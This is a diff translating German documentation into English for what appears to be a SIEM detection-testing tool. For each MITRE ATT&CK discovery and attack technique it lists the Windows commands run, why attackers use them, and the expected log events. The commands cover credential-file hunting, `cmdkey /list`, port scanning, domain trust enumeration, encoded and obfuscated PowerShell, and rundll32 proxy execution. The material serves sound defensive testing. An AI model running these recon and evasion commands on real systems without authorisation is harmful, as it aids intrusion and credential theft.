+**Why attackers do this:** System information is the first step after a compromise. The WMIC queries with `ComputerSystem`, `BIOS` and `OS` are particularly characteristic — Exabeam evaluates the burst of multiple Discovery tools in a short time as a UEBA anomaly. `MachineGuid` from the registry is used for system fingerprinting. `whoami /priv` shows existing privileges for privilege escalation planning.
 
-**Erwartete SIEM-Events:**
-- `4688` — `systeminfo.exe`, `wmic.exe`, `hostname.exe`, `whoami.exe`, `net.exe` (Burst mehrerer 4688-Events)
-- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile und Hash für jeden Befehl
-- `4104` — ScriptBlock: WMIC- und Registry-Abfragen
+**Expected SIEM Events:**
+- `4688` — `systeminfo.exe`, `wmic.exe`, `hostname.exe`, `whoami.exe`, `net.exe` (burst of multiple 4688 events)
+- `Sysmon 1` — Process creation with full command line and hash for each command
+- `4104` — ScriptBlock: WMIC and registry queries
 
 ---
 
 #### T1087 — Account Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) |
-| Taktik | Discovery |
-| Exabeam-Regeln | 25 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Exabeam Rules | 25 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-net user                           # Alle lokalen Benutzerkonten (EID 4688)
-net user /domain 2>&1              # Domain-Benutzer (EID 4688)
-net localgroup administrators      # Admin-Gruppenmitglieder
-whoami /all                        # Aktueller Benutzer + Privileges + SID
-cmdkey /list                       # Gespeicherte Credentials (Lateral-Movement-Vorbereitung)
-query user 2>&1                    # Aktive Terminal-Sessions
-wmic useraccount get Name,SID,Disabled,PasswordExpires  # WMI Account-Enumeration
-dir C:\Users 2>&1                  # Alle Benutzerprofile (zeigt Accounts ohne net.exe)
+net user                           # All local user accounts (EID 4688)
+net user /domain 2>&1              # Domain users (EID 4688)
+net localgroup administrators      # Admin group members
+whoami /all                        # Current user + privileges + SID
+cmdkey /list                       # Stored credentials (lateral movement preparation)
+query user 2>&1                    # Active terminal sessions
+wmic useraccount get Name,SID,Disabled,PasswordExpires  # WMI account enumeration
+dir C:\Users 2>&1                  # All user profiles (shows accounts without net.exe)
 ```
 
-**Warum das Angreifer tun:** Account Discovery ist Voraussetzung für Privilege Escalation und Lateral Movement. `cmdkey /list` zeigt gespeicherte Credentials für RDP und andere Dienste — ein direkter Schatz für Angreifer. `query user` zeigt aktive Sessions (wer ist gerade eingeloggt). `dir C:\Users` listet Accounts ohne Windows-Befehl. Die Kombination mehrerer Methoden erzeugt ein Burst-Muster im SIEM.
+**Why attackers do this:** Account Discovery is a prerequisite for privilege escalation and lateral movement. `cmdkey /list` shows stored credentials for RDP and other services — a direct treasure trove for attackers. `query user` shows active sessions (who is currently logged in). `dir C:\Users` lists accounts without a Windows command. The combination of multiple methods generates a burst pattern in the SIEM.
 
-**Erwartete SIEM-Events:**
-- `4688` — `net.exe`, `whoami.exe`, `cmdkey.exe`, `wmic.exe`, `query.exe` (Burst mehrerer Events)
-- `Sysmon 1` — Prozesschain mit Kommandozeilen-Argumenten
-- `4104` — ScriptBlock: WMIC-Account-Abfrage
+**Expected SIEM Events:**
+- `4688` — `net.exe`, `whoami.exe`, `cmdkey.exe`, `wmic.exe`, `query.exe` (burst of multiple events)
+- `Sysmon 1` — Process chain with command-line arguments
+- `4104` — ScriptBlock: WMIC account query
 
 ---
 
 #### T1049 — System Network Connections Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1049](https://attack.mitre.org/techniques/T1049/) |
-| Taktik | Discovery |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-netstat -ano                   # Alle Verbindungen mit PID (EID 4688)
-netstat -anob                  # +Process-Name (zeigt welcher Prozess welche Verbindung hält)
+netstat -ano                   # All connections with PID (EID 4688)
+netstat -anob                  # +Process name (shows which process holds which connection)
 Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch "127\.0\.0\.1|::1|0\.0\.0\.0" }
-                               # Externe Verbindungen — C2-Server-Identifikation
-net use                        # Aktive Netzlaufwerke (Lateral-Movement-Artefakte)
-net session 2>&1               # Eingehende SMB-Sessions (Benutzer der auf diesen Host zugreift)
-wmic path win32_networkconnection get LocalName,RemoteName,Status  # WMI Netzwerk-Verbindungen
+                               # External connections — C2 server identification
+net use                        # Active network drives (lateral movement artifacts)
+net session 2>&1               # Incoming SMB sessions (user accessing this host)
+wmic path win32_networkconnection get LocalName,RemoteName,Status  # WMI network connections
 ```
 
-**Warum das Angreifer tun:** Aktive Netzwerkverbindungen zeigen dem Angreifer, welche Server das System kennt (Datenbankserver, Domain Controller, Share-Server) — potenzielle Lateral-Movement-Ziele.
+**Why attackers do this:** Active network connections show the attacker which servers the system knows (database servers, domain controllers, share servers) — potential lateral movement targets.
 
-**Erwartete SIEM-Events:**
-- `4688` — `netstat.exe` Prozesserstellung
-- `Sysmon 1` — `netstat.exe` mit `-ano`
+**Expected SIEM Events:**
+- `4688` — `netstat.exe` process creation
+- `Sysmon 1` — `netstat.exe` with `-ano`
 
 ---
 
 #### T1016 — System Network Configuration Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1016](https://attack.mitre.org/techniques/T1016/) |
-| Taktik | Discovery |
-| Exabeam-Regeln | 5 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Exabeam Rules | 5 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-ipconfig /all           # Alle Netzwerkadapter mit Details (IP, MAC, Gateway, DNS)
-route print             # Routing-Tabelle (zeigt Subnetz-Struktur)
-ipconfig /displaydns    # Lokaler DNS-Cache (zeigt bekannte Hostnamen)
+ipconfig /all           # All network adapters with details (IP, MAC, gateway, DNS)
+route print             # Routing table (shows subnet structure)
+ipconfig /displaydns    # Local DNS cache (shows known hostnames)
 ```
 
-**Warum das Angreifer tun:** Die Netzwerkkonfiguration verrät die Subnetz-Topologie, Gateway-Adressen für weiteres Pivoting, und der DNS-Cache zeigt kürzlich kontaktierte Systeme — wertvolle Recon-Information für die Angriffsplanung.
+**Why attackers do this:** The network configuration reveals the subnet topology, gateway addresses for further pivoting, and the DNS cache shows recently contacted systems — valuable recon information for attack planning.
 
-**Erwartete SIEM-Events:**
-- `4688` — `ipconfig.exe` mit `/all` und `/displaydns`
-- `Sysmon 1` — Prozesserstellung mit Argumenten
+**Expected SIEM Events:**
+- `4688` — `ipconfig.exe` with `/all` and `/displaydns`
+- `Sysmon 1` — Process creation with arguments
 
 ---
 
 #### T1057 — Process Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1057](https://attack.mitre.org/techniques/T1057/) |
-| Taktik | Discovery |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# tasklist-Varianten — /v (Benutzerkontext) und /svc (Services) sind am verdächtigsten
-tasklist                      # Alle Prozesse (EID 4688)
-tasklist /v 2>&1              # Verbose mit Benutzerkontext
-tasklist /svc 2>&1            # Services pro Prozess
-tasklist | findstr /i "lsass csrss winlogon svchost defender mssense splunk cb"  # Gezielte Suche
+# tasklist variants — /v (user context) and /svc (services) are most suspicious
+tasklist                      # All processes (EID 4688)
+tasklist /v 2>&1              # Verbose with user context
+tasklist /svc 2>&1            # Services per process
+tasklist | findstr /i "lsass csrss winlogon svchost defender mssense splunk cb"  # Targeted search
 
-# wmic process get CommandLine — höchstes Signal (EID 4688 wmic.exe, CommandLine-Feld)
+# wmic process get CommandLine — highest signal (EID 4688 wmic.exe, CommandLine field)
 wmic process get Name,ProcessId,ParentProcessId,CommandLine /format:csv
 
-# PowerShell Win32_Process mit CommandLine (EID 4104)
+# PowerShell Win32_Process with CommandLine (EID 4104)
 Get-WmiObject Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine | Where-Object { $_.CommandLine -ne $null }
 
-# Parent-Child-Tree-Rekonstruktion — Angreifer kartiert Prozesskette
+# Parent-Child tree reconstruction — attacker maps process chain
 Get-WmiObject Win32_Process | ForEach-Object {
     $parent = (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.ParentProcessId)").Name
     [PSCustomObject]@{ Name=$_.Name; PID=$_.ProcessId; Parent=$parent }
 } | Where-Object { $_.Name -match "lsass|csrss|winlogon|services|svchost" }
 ```
 
-**Warum das Angreifer tun:** Angreifer enumerieren Prozesse, um Security-Tools zu identifizieren (Sysmon, Splunk, CrowdStrike), die sie deaktivieren müssen. `wmic process get CommandLine` ist besonders hochwertig, weil es die vollständige Kommandozeile aller laufenden Prozesse zeigt — ein direktes Erkennungssignal für dieses Argument. Die Parent-Child-Rekonstruktion hilft Angreifern, Injection-Ziele zu identifizieren.
+**Why attackers do this:** Attackers enumerate processes to identify security tools (Sysmon, Splunk, CrowdStrike) that they need to disable. `wmic process get CommandLine` is particularly valuable because it shows the full command line of all running processes — a direct detection signal for this argument. The parent-child reconstruction helps attackers identify injection targets.
 
-**Erwartete SIEM-Events:**
-- `4688` — `tasklist.exe` mit `/v` und `/svc`, `wmic.exe` mit `process get commandline`
-- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile
-- `4104` — ScriptBlock: `Win32_Process CommandLine`-Abfrage
+**Expected SIEM Events:**
+- `4688` — `tasklist.exe` with `/v` and `/svc`, `wmic.exe` with `process get commandline`
+- `Sysmon 1` — Process creation with full command line
+- `4104` — ScriptBlock: `Win32_Process CommandLine` query
 
 ---
 
 #### T1083 — File and Directory Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1083](https://attack.mitre.org/techniques/T1083/) |
-| Taktik | Discovery |
-| Exabeam-Regeln | 38 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Exabeam Rules | 38 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# dir /s /b — Angreifer-typisches Verzeichnislisting (EID 4688 für cmd.exe)
+# dir /s /b — attacker-typical directory listing (EID 4688 for cmd.exe)
 cmd /c "dir /s /b `"$env:USERPROFILE`" 2>nul"
 cmd /c "dir /s /b `"C:\Users`" 2>nul"
 
-# tree /F — Verzeichnisstruktur-Kartierung (EID 4688 für tree.com)
+# tree /F — directory structure mapping (EID 4688 for tree.com)
 tree "$env:USERPROFILE" /F 2>&1
 
-# Sensitive Dateisuche — Credential-Hunting-Muster
+# Sensitive file search — credential hunting pattern
 Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore `
     -Include "*.pdf","*.docx","*.xlsx","*.kdb","*.kdbx","*.pem","*.pfx","*.p12" |
     Select-Object FullName, Length, LastWriteTime
 
-# Kürzlich modifizierte Dateien — Angreifer prüft aktuelle Aktivität
+# Recently modified files — attacker checks recent activity
 Get-ChildItem -Path $env:USERPROFILE -Recurse -ErrorAction Ignore |
     Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
     Sort-Object LastWriteTime -Descending | Select-Object -First 10
 
-# Alternate Data Stream (ADS) Erkennung — versteckte Daten
+# Alternate Data Stream (ADS) detection — hidden data
 Get-ChildItem -Path $env:TEMP -ErrorAction Ignore | ForEach-Object {
     $streams = Get-Item $_.FullName -Stream * | Where-Object { $_.Stream -ne ':$DATA' }
     if ($streams) { Write-Host "ADS found: $($_.FullName)" }
 }
 
-# Credential-Datei-Suche via findstr
+# Credential file search via findstr
 cmd /c "dir /s /b `"$env:USERPROFILE`"" | Where-Object { $_ -match "pass|cred|secret|key|token|\.config$|\.env$" }
 ```
 
-**Warum das Angreifer tun:** Angreifer suchen nach KeePass-Datenbanken (`.kdbx`), Zertifikaten (`.pem/.pfx`), kürzlich bearbeiteten Dateien und Credential-Dateien. `dir /s /b` und `tree /F` sind charakteristische Angreifer-Befehle (keine normalen Benutzer verwenden diese). ADS-Erkennung zeigt, ob versteckte Daten vorhanden sind.
+**Why attackers do this:** Attackers search for KeePass databases (`.kdbx`), certificates (`.pem/.pfx`), recently edited files, and credential files. `dir /s /b` and `tree /F` are characteristic attacker commands (no normal users use these). ADS detection shows whether hidden data is present.
 
-**Erwartete SIEM-Events:**
-- `4688` — `cmd.exe` mit `dir /s /b`, `tree.com`-Prozess
-- `Sysmon 1` — `tree.com` und `cmd.exe` Prozesserstellung
-- `4104` — ScriptBlock: `Get-ChildItem` mit sensitiven Include-Filtern und ADS-Erkennung
+**Expected SIEM Events:**
+- `4688` — `cmd.exe` with `dir /s /b`, `tree.com` process
+- `Sysmon 1` — `tree.com` and `cmd.exe` process creation
+- `4104` — ScriptBlock: `Get-ChildItem` with sensitive include filters and ADS detection
 
 ---
 
 #### T1069 — Permission Groups Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1069.001](https://attack.mitre.org/techniques/T1069/001/) |
-| Taktik | Discovery |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# net localgroup Administrators — höchstes Signal in SIEM-Regeln (standalone Tier-1-Alert)
-net localgroup                          # Alle Gruppen
-net localgroup Administrators           # Admin-Mitglieder (standalone Tier-1 SIEM-Alert)
-net localgroup "Remote Desktop Users"   # RDP-Berechtigung
-net localgroup "Remote Management Users" # WinRM-Berechtigung
-net localgroup "Backup Operators"       # Backup-Privilege (kann SAM dumpen)
+# net localgroup Administrators — highest signal in SIEM rule sets (standalone Tier-1 alert)
+net localgroup                          # All groups
+net localgroup Administrators           # Admin members (standalone Tier-1 SIEM alert)
+net localgroup "Remote Desktop Users"   # RDP permission
+net localgroup "Remote Management Users" # WinRM permission
+net localgroup "Backup Operators"       # Backup privilege (can dump SAM)
 
-# whoami /groups — aktuelle Gruppenmitgliedschaft
+# whoami /groups — current group membership
 whoami /groups /fo csv
 
 # PowerShell Get-LocalGroup / Get-LocalGroupMember (EID 4104)
 Get-LocalGroup | Select-Object Name, Description, SID
 Get-LocalGroupMember -Group "Administrators"
 
-# wmic Gruppen-Enumeration (EID 4688 für wmic.exe)
+# wmic group enumeration (EID 4688 for wmic.exe)
 wmic group get Name,SID,Domain,LocalAccount /format:csv
 
-# .NET WindowsIdentity — Angreifer prüft eigene Privileges
+# .NET WindowsIdentity — attacker checks own privileges
 [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object {
     try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
 } | Where-Object { $_ -match "Admin|Power|Remote|Backup" }
 
-# Domain-Gruppen (wenn domain-joined)
+# Domain groups (if domain-joined)
 net group /domain 2>&1
 net group "Domain Admins" /domain 2>&1
 ```
 
-**Warum das Angreifer tun:** `net localgroup Administrators` ist einer der am stärksten signierten Befehle in SIEM-Regelwerken — viele Lösungen haben ihn als standalone Tier-1-Alert. "Remote Management Users" zeigt WinRM-Zugangsmöglichkeiten für PowerShell-Remoting. "Backup Operators" hat das Recht, die SAM-Datenbank zu lesen — ein Escalation-Pfad.
+**Why attackers do this:** `net localgroup Administrators` is one of the most heavily signed commands in SIEM rule sets — many solutions treat it as a standalone Tier-1 alert. "Remote Management Users" shows WinRM access paths for PowerShell remoting. "Backup Operators" have the right to read the SAM database — an escalation path.
 
-**Erwartete SIEM-Events:**
-- `4688` — `net.exe` mit `localgroup Administrators` — **standalone Tier-1 SIEM-Alert**
-- `4688` — `whoami.exe` mit `/groups`, `wmic.exe`
-- `4104` — ScriptBlock: `Get-LocalGroup`, `.NET WindowsIdentity`-Abfragen
+**Expected SIEM Events:**
+- `4688` — `net.exe` with `localgroup Administrators` — **standalone Tier-1 SIEM alert**
+- `4688` — `whoami.exe` with `/groups`, `wmic.exe`
+- `4104` — ScriptBlock: `Get-LocalGroup`, `.NET WindowsIdentity` queries
 
 ---
 
 #### T1046 — Network Service Discovery (Port Scan)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1046](https://attack.mitre.org/techniques/T1046/) |
-| Taktik | Discovery |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Paralleler Port-Scan via RunspaceFactory — erzeugt Burst-Signatur (wie echte Scanner)
-# 10 Runspaces gleichzeitig — sequentielle Scans erzeugen kein erkennbares Scanner-Pattern
+# Parallel port scan via RunspaceFactory — generates burst signature (like real scanners)
+# 10 runspaces simultaneously — sequential scans don't create a recognizable scanner pattern
 $ports = @(21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5985, 5986, 8080, 8443, 9389)
 $pool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, 10)
 $pool.Open()
@@ -666,126 +665,126 @@ $jobs | ForEach-Object { $_.PS.EndInvoke($_.Handle); $_.PS.Dispose() }
 $pool.Close()
 ```
 
-**Warum das Angreifer tun:** Port-Scanning dient der Service-Identifikation für Lateral Movement. Der entscheidende Unterschied: Sequentielle Scans erzeugen kein erkennbares Muster in SIEM-Regelwerken. **Parallele** Verbindungsversuche erzeugen einen Burst von Sysmon-EID-3-Events in sehr kurzer Zeit — genau das Muster, das Nmap und andere Scanner erzeugen und auf das SIEM-Korrelationsregeln prüfen.
+**Why attackers do this:** Port scanning serves service identification for lateral movement. The key difference: Sequential scans don't create a recognizable pattern in SIEM rule sets. **Parallel** connection attempts generate a burst of Sysmon EID 3 events in a very short time — exactly the pattern that Nmap and other scanners generate and that SIEM correlation rules check for.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 3` — NetworkConnect-Burst: 18 Events in ~1-2 Sekunden (Burst-Signatur = Scanner-Pattern)
-- `4688` — `powershell.exe` Prozesserstellung
-- `4104` — ScriptBlock: RunspaceFactory-Parallel-Scan
+**Expected SIEM Events:**
+- `Sysmon 3` — NetworkConnect burst: 18 events in ~1-2 seconds (burst signature = scanner pattern)
+- `4688` — `powershell.exe` process creation
+- `4104` — ScriptBlock: RunspaceFactory parallel scan
 
 ---
 
 #### T1135 — Network Share Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1135](https://attack.mitre.org/techniques/T1135/) |
-| Taktik | Discovery |
-| Exabeam-Regeln | 12 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Exabeam Rules | 12 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-net share                                   # Lokale Freigaben
-net view \\$env:COMPUTERNAME                # Freigaben auf lokalem Host
-Get-SmbShare                                # PowerShell SMB-Enumeration
+net share                                   # Local shares
+net view \\$env:COMPUTERNAME                # Shares on local host
+Get-SmbShare                                # PowerShell SMB enumeration
 
-# Zugriff auf Admin-Shares (generiert Event 5140)
+# Access admin shares (generates Event 5140)
 foreach ($share in @("C$", "IPC$", "ADMIN$")) {
     Test-Path "\\$env:COMPUTERNAME\$share"
 }
 ```
 
-**Warum das Angreifer tun:** Netzwerkfreigaben sind primäre Exfiltrationsziele. Admin-Shares (`C$`, `ADMIN$`) ermöglichen Remote-Code-Execution. Event 5140 (Network Share Object Access) ist ein wichtiges Exabeam-Signal für ungewöhnlichen Share-Zugriff.
+**Why attackers do this:** Network shares are primary exfiltration targets. Admin shares (`C$`, `ADMIN$`) enable remote code execution. Event 5140 (Network Share Object Access) is an important Exabeam signal for unusual share access.
 
-**Erwartete SIEM-Events:**
-- `4688` — `net.exe` mit `view` und `share`
+**Expected SIEM Events:**
+- `4688` — `net.exe` with `view` and `share`
 - `5140` — Network share object accessed
-- `Sysmon 3` — SMB-Verbindungen (Port 445)
+- `Sysmon 3` — SMB connections (Port 445)
 
 ---
 
 #### T1482 — Domain Trust Discovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1482](https://attack.mitre.org/techniques/T1482/) |
-| Taktik | Discovery |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Discovery |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# nltest — häufigstes Angreifer-Tool für Trust-Enumeration
-nltest /domain_trusts           # Alle Trust-Beziehungen
-nltest /dclist:$env:USERDOMAIN  # Domain Controller auflisten
+# nltest — most common attacker tool for trust enumeration
+nltest /domain_trusts           # All trust relationships
+nltest /dclist:$env:USERDOMAIN  # List domain controllers
 
-# PowerShell .NET Trust-Enumeration
+# PowerShell .NET trust enumeration
 $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $domain.GetAllTrustRelationships()
 ```
 
-**Warum das Angreifer tun:** Domain-Trusts sind die Brücken für Forest-übergreifendes Lateral Movement. Ein Angreifer, der eine Domain-Vertrauensbeziehung kennt, kann sich in vertraute Domains bewegen. `nltest.exe` mit `/domain_trusts` ist ein so charakteristisches Angreifer-Muster, dass viele EDR-Lösungen diesen Aufruf direkt als Indicator of Compromise werten.
+**Why attackers do this:** Domain trusts are the bridges for forest-spanning lateral movement. An attacker who knows a domain trust relationship can move into trusted domains. `nltest.exe` with `/domain_trusts` is such a characteristic attacker pattern that many EDR solutions directly classify this call as an Indicator of Compromise.
 
-**Erwartete SIEM-Events:**
-- `4688` — `nltest.exe` mit `/domain_trusts`
-- `Sysmon 1` — `nltest.exe` Prozesserstellung
+**Expected SIEM Events:**
+- `4688` — `nltest.exe` with `/domain_trusts`
+- `Sysmon 1` — `nltest.exe` process creation
 
 ---
 
 ### Phase 2: Attack
 
-Attack-Techniken simulieren die eigentlichen Angriffs- und Post-Exploitation-Aktionen. Viele dieser Techniken erfordern Administratorrechte und legen Artefakte an, die im Cleanup entfernt werden.
+Attack techniques simulate the actual attack and post-exploitation actions. Many of these techniques require administrator rights and create artifacts that are removed during cleanup.
 
 ---
 
 #### T1059.001 — PowerShell Execution
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) |
-| Taktik | Execution |
-| Exabeam-Regeln | **79** |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Execution |
+| Exabeam Rules | **79** |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# 1. Encoded Command — typisches Angreifer-Obfuscation-Muster
+# 1. Encoded Command — typical attacker obfuscation pattern
 $command = "Write-Host 'LogNoJutsu: Simulated payload'; Get-Date; whoami"
 $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
 powershell.exe -NonInteractive -EncodedCommand $encoded
 
-# 2. Invoke-Expression — simuliertes Download-Cradle (IEX) Muster
+# 2. Invoke-Expression — simulated download cradle (IEX) pattern
 $simulatedPayload = { Get-Process | Select-Object -First 5 }
 Invoke-Expression ($simulatedPayload.ToString())
 ```
 
-**Warum das Angreifer tun:** PowerShell ist das wichtigste Angreifer-Tool auf Windows-Systemen. Die `-EncodedCommand`-Flag ist das Standardmuster für Obfuscation. `Invoke-Expression` (IEX) kombiniert mit Download-Cradles ist das Muster für dateilose Malware. Mit 79 dedizierten Exabeam-Regeln ist T1059.001 eine der wichtigsten zu testenden Techniken.
+**Why attackers do this:** PowerShell is the most important attacker tool on Windows systems. The `-EncodedCommand` flag is the standard pattern for obfuscation. `Invoke-Expression` (IEX) combined with download cradles is the pattern for fileless malware. With 79 dedicated Exabeam rules, T1059.001 is one of the most important techniques to test.
 
-**Erwartete SIEM-Events:**
-- `4688` — `powershell.exe` mit `-EncodedCommand` in der Kommandozeile
-- `4104` — ScriptBlock-Logging des dekodierten Befehls
-- `4103` — Module-Logging
-- `Sysmon 1` — Prozesserstellung mit Base64-Payload im Argument
+**Expected SIEM Events:**
+- `4688` — `powershell.exe` with `-EncodedCommand` in the command line
+- `4104` — ScriptBlock logging of the decoded command
+- `4103` — Module logging
+- `Sysmon 1` — Process creation with Base64 payload in argument
 
 ---
 
 #### T1059.003 — Windows Command Shell
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) |
-| Taktik | Execution |
-| Exabeam-Regeln | 34 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Execution |
+| Exabeam Rules | 34 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```cmd
 cmd.exe /C "whoami /all"
@@ -795,133 +794,133 @@ cmd.exe /C "systeminfo | findstr /B /C:`"OS Name`" /C:`"Domain`""
 cmd.exe /C "dir C:\Users /AD"
 ```
 
-**Warum das Angreifer tun:** `cmd.exe` ist auf jedem Windows-System vorhanden und wird von Angreifern für schnelle System-Recon und als Shell nach Exploitation genutzt. Die charakteristischen Befehle (`whoami`, `net user`, `systeminfo`) sind starke SIEM-Signale, da normale Benutzer diese selten ausführen.
+**Why attackers do this:** `cmd.exe` is present on every Windows system and is used by attackers for quick system recon and as a shell after exploitation. The characteristic commands (`whoami`, `net user`, `systeminfo`) are strong SIEM signals, as normal users rarely execute these.
 
-**Erwartete SIEM-Events:**
-- `4688` — `cmd.exe` mit `/C` und verdächtigen Argumenten (mehrfach)
-- `Sysmon 1` — Prozesserstellung mit vollständiger Kommandozeile
+**Expected SIEM Events:**
+- `4688` — `cmd.exe` with `/C` and suspicious arguments (multiple times)
+- `Sysmon 1` — Process creation with full command line
 
 ---
 
 #### T1027 — Obfuscated Files or Information
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1027](https://attack.mitre.org/techniques/T1027/) |
-| Taktik | Defense Evasion |
-| Exabeam-Regeln | 47 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Defense Evasion |
+| Exabeam Rules | 47 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# 1. Base64-encoded Command (häufigstes Muster in der Praxis)
+# 1. Base64-encoded Command (most common pattern in practice)
 $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
 powershell.exe -EncodedCommand $encoded
 
-# 2. String-Concatenation Obfuscation (umgeht einfache Signaturen)
+# 2. String-Concatenation Obfuscation (bypasses simple signatures)
 $a = "Get-"; $b = "Pro"; $c = "cess"
 Invoke-Expression ($a + $b + $c)
 
-# 3. Tick-Mark Obfuscation (PowerShell Escape-Zeichen als Obfuscation)
+# 3. Tick-Mark Obfuscation (PowerShell escape character as obfuscation)
 G`et-`Hos`tN`ame
 
-# 4. Double-Encoded Command (triggert Exabeam-Anomalie für verschachtelte Encoding)
+# 4. Double-Encoded Command (triggers Exabeam anomaly for nested encoding)
 powershell.exe -EncodedCommand <base64(powershell.exe -EncodedCommand <base64>)>
 ```
 
-**Warum das Angreifer tun:** Obfuscation ist der primäre Mechanismus, um signaturbasierte Erkennungen zu umgehen. Exabeam hat 47 dedizierte Regeln für diese Technik, weil es ein universelles Angreifer-Verhalten ist. Besonders Double-Encoding ist ein starkes Signal, da kein legitimes Skript so vorgehen würde.
+**Why attackers do this:** Obfuscation is the primary mechanism for bypassing signature-based detections. Exabeam has 47 dedicated rules for this technique because it is universal attacker behavior. Double-encoding in particular is a strong signal, as no legitimate script would do this.
 
-**Erwartete SIEM-Events:**
-- `4104` — ScriptBlock-Logging zeigt obfuszierten Code
-- `4688` — `powershell.exe` mit `-EncodedCommand` oder `-Enc` Flag
-- `Sysmon 1` — Prozessargument enthält Base64-String
+**Expected SIEM Events:**
+- `4104` — ScriptBlock logging shows obfuscated code
+- `4688` — `powershell.exe` with `-EncodedCommand` or `-Enc` flag
+- `Sysmon 1` — Process argument contains Base64 string
 
 ---
 
 #### T1218.011 — Rundll32 Proxy Execution
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1218.011](https://attack.mitre.org/techniques/T1218/011/) |
-| Taktik | Defense Evasion |
-| Exabeam-Regeln | 27 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Defense Evasion |
+| Exabeam Rules | 27 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Rundll32 shell32.dll — generiert Sysmon Event 1 und 7 (DLL loaded)
+# Rundll32 shell32.dll — generates Sysmon Event 1 and 7 (DLL loaded)
 Start-Process "rundll32.exe" -ArgumentList "shell32.dll,Control_RunDLL"
 
-# Rundll32 advpack.dll — häufig in Malware für INF-Execution
+# Rundll32 advpack.dll — commonly used in malware for INF execution
 Start-Process "rundll32.exe" -ArgumentList "advpack.dll,DelNodeRunDLL32 test.inf"
 
-# Rundll32 url.dll — phishing-typisches Muster
+# Rundll32 url.dll — phishing-typical pattern
 Start-Process "rundll32.exe" -ArgumentList "url.dll,FileProtocolHandler"
 ```
 
